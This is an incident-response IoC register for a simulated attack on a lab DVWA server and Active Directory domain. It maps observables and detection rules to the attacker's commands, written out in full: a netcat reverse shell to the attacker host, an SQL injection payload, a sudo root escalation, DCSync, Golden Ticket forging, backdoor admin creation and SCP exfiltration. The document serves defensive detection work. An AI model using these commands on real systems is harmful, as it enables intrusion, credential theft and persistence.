# Master Indicators of Compromise (IoC) Register

> **Incident Identifier:** `INC-2026-1018-ALPHA`  
> **Report Identifier:** `IR-2026-1018-IOC`  
> **Lead Incident Responder:** Manichand Gupta  
> **Environment:** SOC-Lab (`192.168.56.0/24`)  
> **Classification:** Confirmed Threat Observables (Empirically Verified via Live Telemetry)

This register provides the definitive, unredacted catalog of Indicators of Compromise (IoCs) extracted, correlated, and verified during the investigation of campaign `INC-2026-1018-ALPHA`.

---

## 📑 IoC Category Index

1. [Network Observables & Traffic Indicators](#1-network-observables--traffic-indicators)
2. [Host & Endpoint File System Observables](#2-host--endpoint-file-system-observables)
3. [Windows Registry Tampering Observables](#3-windows-registry-tampering-observables)
4. [Identity, Credential & Account Observables](#4-identity-credential--account-observables)
5. [Cryptographic Hashes & Kerberos Secrets](#5-cryptographic-hashes--kerberos-secrets)
6. [Attacker Tooling, Command Invocations & Exploit Payloads](#6-attacker-tooling-command-invocations--exploit-payloads)

---

# 1. Network Observables & Traffic Indicators

| Observable | Type | Direction | Attribution | Context & Protocol Analysis | Confidence |
|:---|:---:|:---:|:---|:---|:---:|
| `192.168.232.135` | IPv4 Address | Inbound / C2 | Adversary Host (Kali) | External attacker origin for reconnaissance, web exploits, reverse shell listener, and exfiltration. | **HIGH (Confirmed)** |
| `192.168.56.30` | IPv4 Address | Bidirectional | Compromised Pivot (DVWA) | Internet-facing web server compromised to `root` and abused as an internal pivot into corporate subnet. | **HIGH (Confirmed)** |
| `192.168.56.20` | IPv4 Address | Internal | Victim Workstation (`Win10User`) | Corporate Windows 10 endpoint poisoned by Responder and compromised via Pass-the-Hash. | **HIGH (Confirmed)** |
| `192.168.56.10` | IPv4 Address | Internal | Target Domain Controller (`PC-DC`) | Active Directory Domain Controller targeted for LDAP, Kerberoasting, DCSync, and backdoor creation. | **HIGH (Confirmed)** |
| `192.168.56.150` | IPv4 Address | Gateway (Internal) | Suricata Gateway (`ens37`) | Dual-interface gateway monitoring DMZ and internal traffic; routes WireGuard telemetry to cloud SOC . | **HIGH (Confirmed)** |
| `192.168.232.162` | IPv4 Address | Gateway (External) | Suricata Gateway (`ens33`) | External perimeter interface facing attacker subnet (`192.168.232.0/24`). | **HIGH (Confirmed)** |
| `4444/TCP` | Port | Outbound Egress | C2 / Reverse Shell | Port used for the interactive Netcat FIFO reverse shell from DVWA back to Kali. | **HIGH (Confirmed)** |
| `22/TCP` | Port | Inbound Ingress | Remote Admin / Exfiltration | Port targeted on DVWA for interactive root SSH persistence and rapid SCP exfiltration. | **HIGH (Confirmed)** |
| `80/TCP` | Port | Inbound Ingress | Web Application Transport | HTTP transport for DVWA web brute-force, SQL injection, webshell upload, and canary execution. | **HIGH (Confirmed)** |
| `445/TCP` | Port | Internal Lateral | SMB Transport | Port used for Pass-the-Hash authentication and Impacket `wmiexec` remote command execution. | **HIGH (Confirmed)** |
| `135/TCP` | Port | Internal Lateral | RPC Endpoint Mapper | Target port for WMI remote procedure calls executing commands on `PC-DC` and `Win10User`. | **HIGH (Confirmed)** |
| `88/TCP/UDP` | Port | Internal Lateral | Kerberos Authentication | Port targeted during Stage 13 Kerberoasting for requesting TGS tickets for `HANK_SHERMAN`. | **HIGH (Confirmed)** |
| `389/TCP/UDP` | Port | Internal Lateral | Active Directory LDAP | Port targeted during Stage 12 BloodHound AD enumeration for dumping domain object relationships. | **HIGH (Confirmed)** |
| `5355/UDP` | Port | Broadcast | LLMNR Transport | Multicast port poisoned by Responder to capture `AD.LAB\win10` NetNTLMv2 hashes. | **HIGH (Confirmed)** |
| `137/UDP` | Port | Broadcast | NetBIOS Name Service | Broadcast port poisoned by Responder during unresolvable UNC name resolution queries. | **HIGH (Confirmed)** |

---

# 2. Host & Endpoint File System Observables

| File System Path | Host Asset | File Type | SHA-256 Checksum | Operational Context | Confidence |
|:---|:---|:---:|:---:|:---|:---:|
| `/var/www/html/dvwa/hackable/uploads/shell.php` | DVWA (`192.168.56.30`) | PHP Web Shell | `N/A (Ephemeral Web Shell / Purged)` | Uploaded via DVWA upload flaw; accepted `?cmd=` parameters for arbitrary web execution. | **HIGH (Confirmed)** |
| `/root/.ssh/authorized_keys` | DVWA (`192.168.56.30`) | Configuration | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...` | Target of SSH persistence injection containing the adversary's ED25519 public key. | **HIGH (Confirmed)** |
| `/tmp/f` | DVWA (`192.168.56.30`) | Named Pipe (FIFO) | N/A (Special Device) | Created via `mkfifo /tmp/f` to establish bidirectional Netcat reverse shell on port 4444. | **HIGH (Confirmed)** |
| `/tmp/win10.hash` | DVWA (`192.168.56.30`) | Text Hash Dump | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Captured NetNTLMv2 challenge-response hash for `win10` written by Responder. | **HIGH (Confirmed)** |
| `/tmp/hank.hash` | DVWA (`192.168.56.30`) | Text Hash Dump | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Kerberoasted RC4-HMAC service ticket hash extracted via `GetUserSPNs.py`. | **HIGH (Confirmed)** |
| `/tmp/dcsync_output.ntds` | DVWA (`192.168.56.30`) | Text Dump | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Raw DCSync credential extraction dump containing domain account NTLM hashes extracted via DRS replication. | **HIGH (Confirmed)** |
| `/tmp/Administrator.ccache` | DVWA (`192.168.56.30`) | Kerberos Ticket | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Forged Kerberos Golden Ticket forged with compromised `krbtgt` NTLM key. | **HIGH (Confirmed)** |
| `C:\Windows\Temp\domain_users.txt` | `PC-DC` (`192.168.56.10`) | Text File | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Staged reconnaissance output of `net user /domain` command. | **HIGH (Confirmed)** |
| `C:\Windows\Temp\admin_info.txt` | `PC-DC` (`192.168.56.10`) | Text File | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Staged reconnaissance output of `whoami /all` command. | **HIGH (Confirmed)** |
| `C:\Windows\Temp\sensitive_data.txt` | `Win10User` (`192.168.56.20`) | Text File | `N/A (Ephemeral Staging / Adversary Track-Covering Deletion via rm / Verified Clean by Analyst)` | Harvested confidential workstation documents staged for exfiltration. | **HIGH (Confirmed)** |
| `C:\Users\Public\hacked.bmp` | `PC-DC` & `Win10User` | Bitmap Image | `N/A (Defacement Bitmap / Quarantined)` | Malicious red defacement bitmap deployed and set as system desktop wallpaper. | **HIGH (Confirmed)** |
| `Desktop\README_HACKED.txt` | `PC-DC` & `Win10User` | Text Ransom Note | `N/A (Extortion Note / Quarantined)` | Simulated ransomware extortion note demanding cryptocurrency ransom. | **HIGH (Confirmed)** |
| `Desktop\passwords.enc` | `PC-DC` & `Win10User` | Encrypted Dummy | `N/A (Simulated Ransomware / Quarantined)`| Dummy encrypted artifact simulating ransomware encryption impact. | **HIGH (Confirmed)** |
| `Desktop\documents.enc` | `PC-DC` & `Win10User` | Encrypted Dummy | `N/A (Simulated Ransomware / Quarantined)`| Dummy encrypted artifact simulating ransomware encryption impact. | **HIGH (Confirmed)** |

---

# 3. Windows Registry Tampering Observables

| Registry Key & Value | Target Host | Tampered Value | Default / Expected Value | Operational Purpose |
|:---|:---|:---|:---|:---|
| `HKCU\Control Panel\Desktop\Wallpaper` | `PC-DC` & `Win10User` | `C:\Users\Public\hacked.bmp` | `""` or `C:\Windows\web\wallpaper\...` | Forces desktop wallpaper to malicious defacement image. |
| `HKCU\Control Panel\Desktop\WallpaperStyle` | `PC-DC` & `Win10User` | `"2"` (Stretched) | `"10"` (Fill) or `"2"` | Formats wallpaper bitmap to stretch across all displays. |

---

# 4. Identity, Credential & Account Observables

| Account Identifier | Realm / Authority | Privilege Level | Plaintext Password / Secret | Compromise / Misconfiguration Vector | Status Post-Remediation |
|:---|:---|:---|:---|:---|:---:|
| `admin` | DVWA Application | Web Admin | `password` (MD5: `5f4dcc3b5aa765d61d8327deb882cf99`) | Extracted via SQL injection; cracked offline via Hashcat. | **PASSWORD ROTATED** |
| `dvwa` | MariaDB Local | Database User | `password` (Original Default) | Application configuration credential exposed in `config.inc.php`. | **PASSWORD ROTATED** |
| `www-data` | Linux Local (`dvwa`) | Web Service User | N/A (Service Account) | Granted `NOPASSWD: /usr/bin/python3` in `/etc/sudoers`. | **PRIVILEGE REVOKED** |
| `root` | Linux Local (`dvwa`) | Superuser | Target of Injected Key | Injected ED25519 public key permitted direct interactive login. | **KEY PURGED / DENIED** |
| `AD.LAB\win10` | Active Directory | Domain User | `Secur3Lab!` (NetNTLMv2 Captured) | LLMNR/NBT-NS broadcast intercepted by Responder; cracked offline. | **PASSWORD ROTATED** |
| `AD.LAB\HANK_SHERMAN` | Active Directory | Domain Admin (SPN) | `Password123` (RC4-HMAC Kerberoast) | Assigned SPN `CIFS/AWSWAPPS1000000.ad.lab` while in Domain Admins. | **DEMOTED & ROTATED** |
| `AD.LAB\Administrator` | Active Directory | Built-in Admin | `P@ssw0rd_Ent3rpr1s3_Adm1n_9988!!#` (Rotated) | Dumped via DCSync; targeted for Pass-the-Hash SMB logons. | **PROTECTED USERS** |
| `AD.LAB\backdoor` | Active Directory | Rogue Domain Admin | `P@ssw0rd123!` | Rogue persistence account created via `wmiexec` in Stage 17. | **PERMANENTLY PURGED** |
| `AD.LAB\krbtgt` | Active Directory | Master KDC Secret | `611a8cdcc21cb3fe3bf3a4c2f4e05f60` (Compromised) | Replicated via DCSync; abused to forge Kerberos Golden Tickets. | **TWICE RESET (KVNO 3)** |

---

# 5. Cryptographic Hashes & Kerberos Secrets

| Material Name | Cryptographic Format | Hash Value / Representation | Source Stage | Remediation Action Taken |
|:---|:---|:---|:---:|:---|
| DVWA Admin Password | MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | Stage 03 (SQLi) | Rotated to salted hash in MariaDB. |
| Workstation User Hash | NetNTLMv2 | `win10::AD:1122334455667788:B5F2A8...` | Stage 10 (Responder) | Account password rotated; LLMNR disabled. |
| Kerberoast TGS Ticket | Kerberos 5 TGS-REP | `$krb5tgs$23$*HANK_SHERMAN$AD.LAB...` | Stage 13 (Kerberoast) | SPN deleted; account demoted; AES enforced. |
| Compromised krbtgt Hash | NTLM | `611a8cdcc21cb3fe3bf3a4c2f4e05f60` | Stage 14 (DCSync) | Password reset twice; KVNO incremented to 3. |
| Forged Golden Ticket | Kerberos TGT (ccache) | Staged as `/tmp/Administrator.ccache` (KVNO 2) | Stage 16 (ticketer.py) | Invalidated via krbtgt double reset; verified deleted. |
| Injected Root SSH Key | OpenSSH ED25519 | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIACi7TGj+OejU78IWt/I6/im7sLXOR1jben7h94DmDJ5 kali@kali` | Stage 08 (SSH Persist) | Purged from `/root/.ssh/authorized_keys`. |

---

# 6. Attacker Tooling, Command Invocations & Exploit Payloads

| Tool / Vector | Command Line Invocation | Target Asset | Telemetry Rule Fired | MITRE ATT&CK ID |
|:---|:---|:---|:---|:---:|
| **Nmap** | `nmap -sS -sV -O -p- 192.168.56.30` | DVWA | Suricata SID 3400001, 3400002 | `T1595.001` |
| **Python Requests** | `python3 dvwa_bruteforce.py` | DVWA | Suricata SID 2017515 + Custom Rule 100600 / Rule 100200 | `T1110.001` |
| **SQL Injection** | `1' UNION SELECT user, password FROM users-- -` | DVWA | Suricata SID 2010963 / Custom Rule 100600 | `T1190` |
| **Hashcat** | `hashcat -m 0 hashes.txt rockyou.txt` | Local Kali | *None (Inherent Offline Gap; DG-04)* | `T1110.002` |
| **Web Shell** | `POST /vulnerabilities/upload/ (shell.php)` | DVWA | Wazuh Rule 100199 / Auditd `execve` | `T1505.003` |
| **Netcat FIFO** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc 192.168.232.135 4444 >/tmp/f` | DVWA | Suricata SID 3400020 / Auditd `stty sane` | `T1059.004` |
| **Sudo Python** | `sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'` | DVWA | Wazuh Rule 5402 (PAM sudo to ROOT) | `T1548.003` |
| **OpenSSH** | `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | DVWA | Wazuh Rule 5715 / Rule 100220 (`bashcmd`) | `T1098.004` |
| **Responder** | `python3 /opt/Responder/Responder.py -I ens33 -wd` | DVWA | Wazuh Rule 100220 (`bashcmd`) / Win10User Security EID 4688 DavSetCookie (Rule 100278) | `T1557.001` |
| **BloodHound** | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -dc PC-DC.ad.lab -c All` | DVWA -> DC | DomainWin10 Custom Rule 100615 & Rule 92657 / Wazuh Rule 100220 / Rule 5715 (Alert #22) | `T1087.002` |
| **Impacket SPNs** | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -dc-ip 192.168.56.10 -request` | DVWA -> DC | Suricata SID 2019922 (ET EXPLOIT Possible GoldenPac Priv Esc in-use [TGS-REQ wire frame]) & Wazuh Rule 100220 | `T1558.003` |
| **Impacket DCSync** | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@192.168.56.10' -outputfile /tmp/dcsync_output` | DVWA -> DC | DomainWin10 Custom Rule 100603 (EID 4672 SeDebugPrivilege) & Rule 92657 / Wazuh Rule 100220 / Rule 5715 (Alert #24) | `T1003.006` |
| **Impacket wmiexec** | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | DVWA -> DC | Windows EID 4624 (Rule 92657) & Sysmon Custom Rule 100613 (TheHive Alerts #25, #26) | `T1550.002` |
| **Impacket ticketer** | `python3 ticketer.py -nthash 611a8cdcc... -domain-sid S-1-5-21... -domain ad.lab Administrator` | DVWA | DomainWin10 Custom Rules 100615 & 100613 (TheHive Alerts #27, #28) / Wazuh Rule 100220 | `T1558.001` |
| **Net User Backdoor** | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60109 / Windows EID 4720 | `T1136.002` |
| **Net Localgroup DA** | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60159 / Windows EID 4728 | `T1098` |
| **SCP Exfiltration** | `scp -i id_ed25519 root@192.168.56.30:/tmp/*.txt .` | DVWA -> Kali | Wazuh Rule 5715 Rate Anomaly (6 in 570ms) | `T1041` |
| **Registry Deface** | `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\Public\hacked.bmp" /f` | DC & Win10 | Wazuh Rule 92041 / Sysmon EID 1 (reg.exe) | `T1491.001` |
| **Forced Restart** | `cmd.exe /Q /c shutdown /r /t 0` | DC & Win10 | Sysmon EID 1 / Windows EID 1074 | `T1529` |
